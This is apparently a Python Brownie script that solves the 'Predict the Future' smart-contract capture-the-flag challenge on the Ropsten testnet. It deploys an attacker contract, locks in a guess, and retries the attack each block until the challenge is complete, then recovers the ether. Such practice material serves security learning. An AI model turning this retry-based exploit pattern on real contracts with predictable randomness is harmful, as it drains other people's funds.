from brownie import (
    accounts,
    PredictTheFutureChallenge,
    PredictTheFutureAttacker,
    exceptions,
)
from web3 import Web3
import time

### if you try to execute this script again you need to
### delete deployment of attacker contract in build/deployments

eth_amount = Web3.toWei("1", "ether")
challenge_address = "0x9308C5409C71A8581c09033C91EAF43c7B28F61d"
account = accounts.load("Ropsten_test_net_account")


def predict_the_future():
    # get contract
    challenge_contract = PredictTheFutureChallenge.at(challenge_address)
    # deploy hacker contract
    hacker = PredictTheFutureAttacker.deploy(challenge_address, {"from": account})
    print(f"hacker's balance is: {account.balance()}")
    print(f"challenge contract balance is: {challenge_contract.balance()}")
    # lock in guess
    tx_guess = hacker.lockInMyGuess(
        {"from": account, "value": eth_amount, "gas_limit": 1e6, "allow_revert": True}
    )
    tx_guess.wait(1)
    print(f"hacker's balance is: {account.balance()}")
    print(f"challenge contract balance is: {challenge_contract.balance()}")
    # add another block by waiting 30 seconds (extra safe)
    time.sleep(30)
    print("Guess locked in...")
    print("Starting exploit...")
    # start exploit
    while not challenge_contract.isComplete():
        try:
            tx_exploit = hacker.attack(
                {"from": account, "gas_limit": 1e6, "allow_revert": True}
            )
            tx_exploit.wait(1)
            time.sleep(10)
        except:
            print("Attempt failed")
            time.sleep(10)
    print("Attack executed successfully")
    print(tx_exploit.info())
    # recover funds
    tx = hacker.recoverFunds({"from": account})
    tx.wait(1)
    print(f"The hacker's balance is: {account.balance()}")
    # check that we completed the challenge
    print(f"We have completed the challenge: {challenge_contract.isComplete() == True}")


def main():
    predict_the_future()
